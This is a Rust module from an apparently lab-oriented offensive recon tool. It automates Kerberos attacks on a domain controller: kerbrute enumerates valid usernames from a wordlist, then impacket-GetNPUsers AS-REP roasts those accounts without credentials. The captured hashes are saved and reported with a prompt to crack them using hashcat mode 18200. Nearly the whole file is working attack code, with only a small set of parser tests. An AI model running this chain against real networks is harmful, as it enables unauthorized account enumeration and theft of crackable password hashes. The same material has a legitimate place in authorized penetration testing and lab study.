use std::path::Path;

use anyhow::Result;
use colored::Colorize;

use crate::config::{ScanConfig, find_wordlist_or_warn};
use crate::report::Report;
use crate::runner;

/// Run kerbrute userenum against the DC, then AS-REP roast whoever it finds.
pub async fn enumerate(
    ip: &str,
    hostname: &str,
    domain: Option<&str>,
    scan_cfg: &ScanConfig,
    raw_dir: &Path,
    report: &Report,
) -> Result<()> {
    report.section("KERBEROS").await;

    let kerbrute = scan_cfg.tool("kerbrute");
    if !runner::command_exists(&kerbrute).await {
        println!(
            "{} kerbrute not found -- skipping Kerberos user enum",
            "[!]".yellow()
        );
        report
            .add("  (kerbrute not installed -- install: go install github.com/ropnop/kerbrute@latest)")
            .await;
        return Ok(());
    }

    let Some(wl) = find_wordlist_or_warn(&scan_cfg.wordlists.usernames, "kerberos usernames")
    else {
        return Ok(());
    };

    let kerb_domain =
        domain.unwrap_or_else(|| hostname.split_once('.').map(|x| x.1).unwrap_or("htb"));

    println!("{} kerbrute userenum...", "[*]".cyan());
    // 10-minute floor, and the default wordlist is now names.txt (~10k
    // entries), which finishes well inside it — an 8.3M-entry list like
    // xato-net-10-million can never make it and only ever burned the timeout
    // (REVIEW.md finding 10)
    let output = runner::run_cmd_timeout(
        &kerbrute,
        &["userenum", "-d", kerb_domain, "--dc", ip, &wl],
        runner::default_timeout().max(600),
    )
    .await?;

    let valid_lines: Vec<&str> = output.lines().filter(|l| l.contains("VALID")).collect();

    if !valid_lines.is_empty() {
        println!("{} Valid users found!", "[+]".green());
        for line in &valid_lines {
            println!("{}", line.green().bold());
        }
        let text = valid_lines.join("\n");
        report.add(&text).await;

        // AS-REP roast the users we just enumerated — needs no credentials and
        // is the obvious continuation the summary's next-steps already promise.
        let users = parse_kerbrute_users(&output);
        if !users.is_empty() {
            asrep_roast(kerb_domain, ip, &users, raw_dir, report).await;
        }
    } else {
        println!("{} No valid users found", "[!]".yellow());
        report.add("  (no valid users)").await;
    }

    Ok(())
}

/// Extract usernames from kerbrute `userenum` output. kerbrute prints
/// `[+] VALID USERNAME:  user@domain`; GetNPUsers wants the bare
/// sAMAccountName, so any realm suffix is stripped.
fn parse_kerbrute_users(output: &str) -> Vec<String> {
    let mut users: Vec<String> = Vec::new();
    for line in output.lines() {
        if !line.contains("VALID") {
            continue;
        }
        // the account is the last whitespace-separated token on the line
        if let Some(tok) = line.split_whitespace().next_back() {
            let user = tok.split('@').next().unwrap_or(tok).trim();
            if !user.is_empty() && !users.contains(&user.to_string()) {
                users.push(user.to_string());
            }
        }
    }
    users
}

/// AS-REP roast the discovered users via impacket-GetNPUsers (unauthenticated).
/// Best-effort: a failure is recorded, never propagated.
async fn asrep_roast(domain: &str, ip: &str, users: &[String], raw_dir: &Path, report: &Report) {
    let bin = if runner::command_exists("impacket-GetNPUsers").await {
        "impacket-GetNPUsers".to_string()
    } else if runner::command_exists("GetNPUsers.py").await {
        "GetNPUsers.py".to_string()
    } else {
        println!(
            "{} impacket-GetNPUsers not found -- skipping AS-REP roasting",
            "[!]".yellow()
        );
        report
            .add("  (impacket-GetNPUsers not installed -- skipping AS-REP roasting)")
            .await;
        return;
    };

    let userfile = raw_dir.join("kerb-users.txt");
    if let Err(e) = tokio::fs::write(&userfile, users.join("\n") + "\n").await {
        report
            .add_error(
                "KERBEROS",
                &format!("could not write {}: {e}", userfile.display()),
            )
            .await;
        return;
    }
    let outfile = raw_dir.join("asrep.txt");
    let userfile_s = userfile.to_string_lossy().to_string();
    let outfile_s = outfile.to_string_lossy().to_string();
    let target = format!("{domain}/");

    println!(
        "{} AS-REP roasting {} user(s) (no creds needed)...",
        "[*]".cyan(),
        users.len()
    );
    let output = match runner::run_cmd_timeout(
        &bin,
        &[
            &target,
            "-no-pass",
            "-usersfile",
            &userfile_s,
            "-dc-ip",
            ip,
            "-format",
            "hashcat",
            "-outputfile",
            &outfile_s,
        ],
        120,
    )
    .await
    {
        Ok(o) => o,
        Err(e) => {
            println!("{} AS-REP roast failed: {e}", "[!]".yellow());
            report.add_error("KERBEROS", &e.to_string()).await;
            return;
        }
    };

    // the hashes are written to -outputfile; stdout usually echoes them too
    let disk = tokio::fs::read_to_string(&outfile)
        .await
        .unwrap_or_default();
    let mut seen = std::collections::HashSet::new();
    let hashes: Vec<&str> = disk
        .lines()
        .chain(output.lines())
        .map(str::trim)
        .filter(|l| l.contains("$krb5asrep$"))
        .filter(|l| seen.insert(*l))
        .collect();

    if hashes.is_empty() {
        println!(
            "{} No AS-REP-roastable accounts (all require pre-auth)",
            "[!]".yellow()
        );
        report.add("  (no AS-REP-roastable accounts)").await;
        return;
    }

    println!(
        "{} {} AS-REP hash(es) captured -- crack with hashcat -m 18200",
        "[+]".green(),
        hashes.len()
    );
    report
        .add(&format!(
            "  AS-REP hashes ({}) -- crack with `hashcat -m 18200`:",
            hashes.len()
        ))
        .await;
    for h in &hashes {
        report.add(&format!("    {h}")).await;
        report
            .add_vuln(&format!("Kerberos: AS-REP roastable account -- {h}"))
            .await;
    }
    report
        .add(&format!("  (saved: {})", outfile.display()))
        .await;
}

#[cfg(test)]
mod tests {
    use super::parse_kerbrute_users;

    #[test]
    fn extracts_users_and_strips_realm() {
        let out = "\
2026/09/04 12:00:00 >  [+] VALID USERNAME:\t administrator@htb.local
2026/09/04 12:00:01 >  [+] VALID USERNAME:\t svc-web@htb.local
2026/09/04 12:00:02 >  [!] some noise line without the keyword
2026/09/04 12:00:03 >  [+] VALID USERNAME:\t administrator@htb.local
";
        let users = parse_kerbrute_users(out);
        assert_eq!(
            users,
            vec!["administrator".to_string(), "svc-web".to_string()]
        );
    }

    #[test]
    fn handles_bare_usernames_without_realm() {
        let users = parse_kerbrute_users("[+] VALID USERNAME: bob\n");
        assert_eq!(users, vec!["bob".to_string()]);
    }
}
